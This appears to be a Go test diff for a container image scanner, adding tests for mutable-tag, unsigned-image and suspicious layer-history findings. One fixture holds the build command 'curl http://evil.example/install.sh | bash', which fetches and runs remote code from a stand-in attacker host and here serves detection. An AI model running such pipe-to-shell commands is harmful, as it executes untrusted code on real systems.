@@ -33,6 +33,12 @@ type stubRegistry struct {
 	vulnErr  error
 }
 
+type stubSignedRegistry struct {
+	*stubRegistry
+	signature    *SignatureVerification
+	signatureErr error
+}
+
 func (s *stubRegistry) Name() string { return s.name }
 
 func (s *stubRegistry) RegistryHost() string { return "stub.registry.io" }
@@ -61,6 +67,13 @@ func (s *stubRegistry) GetVulnerabilities(context.Context, string, string) ([]Im
 		return nil, s.vulnErr
 	}
 	return s.vulns, nil
+}
+
+func (s *stubSignedRegistry) VerifySignature(_ context.Context, _ string, _ string, _ *ImageManifest) (*SignatureVerification, error) {
+	if s.signatureErr != nil {
+		return nil, s.signatureErr
+	}
+	return s.signature, nil
 }
 
 type stubImageScanner struct {
@@ -325,6 +338,81 @@ func TestContainerScannerFallback_UsesQualifiedRef(t *testing.T) {
 	expected := "stub.registry.io/repo:latest"
 	if local.lastRef != expected {
 		t.Errorf("fallback got ref %q, want %q", local.lastRef, expected)
+	}
+}
+
+func TestContainerScannerScanImage_AddsMutableTagFinding(t *testing.T) {
+	registry := &stubRegistry{
+		name: "stub",
+		manifest: &ImageManifest{
+			Digest: "sha256:abc",
+			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub", "repo", "latest")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-mutable-tag") {
+		t.Fatalf("expected mutable-tag finding, got %#v", result.Findings)
+	}
+}
+
+func TestContainerScannerScanImage_AddsUnsignedImageFinding(t *testing.T) {
+	registry := &stubSignedRegistry{
+		stubRegistry: &stubRegistry{
+			name: "stub-signed",
+			manifest: &ImageManifest{
+				Digest: "sha256:abc",
+				Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+			},
+		},
+		signature: &SignatureVerification{
+			Verified: false,
+			Reason:   "no cosign signature found",
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub-signed", "repo", "v1.2.3")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-unsigned-image") {
+		t.Fatalf("expected unsigned-image finding, got %#v", result.Findings)
+	}
+}
+
+func TestContainerScannerScanImage_AddsLayerHistoryFinding(t *testing.T) {
+	registry := &stubRegistry{
+		name: "stub-history",
+		manifest: &ImageManifest{
+			Digest: "sha256:abc",
+			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+			History: []string{
+				"RUN curl http://evil.example/install.sh | bash",
+			},
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub-history", "repo", "v1.2.3")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-suspicious-build-command") {
+		t.Fatalf("expected suspicious build command finding, got %#v", result.Findings)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-insecure-download") {
+		t.Fatalf("expected insecure download finding, got %#v", result.Findings)
 	}
 }
 
@@ -662,6 +750,36 @@ func TestTrivyScannerError(t *testing.T) {
 	if err == nil {
 		t.Fatal("expected error")
 	}
+}
+
+func TestParseManifest_ExtractsHistoryCommands(t *testing.T) {
+	raw := []byte(`{
+		"mediaType":"application/vnd.docker.distribution.manifest.v1+json",
+		"layers":[{"mediaType":"application/vnd.docker.image.rootfs.diff.tar.gzip","digest":"sha256:layer","size":123}],
+		"history":[
+			{"v1Compatibility":"{\"created_by\":\"RUN curl https://safe.example/install.sh | sh\"}"}
+		]
+	}`)
+
+	manifest := &ImageManifest{}
+	if err := parseManifest(raw, manifest); err != nil {
+		t.Fatalf("parseManifest: %v", err)
+	}
+	if len(manifest.History) != 1 {
+		t.Fatalf("expected 1 history command, got %d", len(manifest.History))
+	}
+	if !strings.Contains(manifest.History[0], "curl https://safe.example/install.sh | sh") {
+		t.Fatalf("unexpected history command: %s", manifest.History[0])
+	}
+}
+
+func hasFindingID(findings []ContainerFinding, id string) bool {
+	for _, finding := range findings {
+		if finding.ID == id {
+			return true
+		}
+	}
+	return false
 }
 
 func writeExecutable(t *testing.T, content string) string {
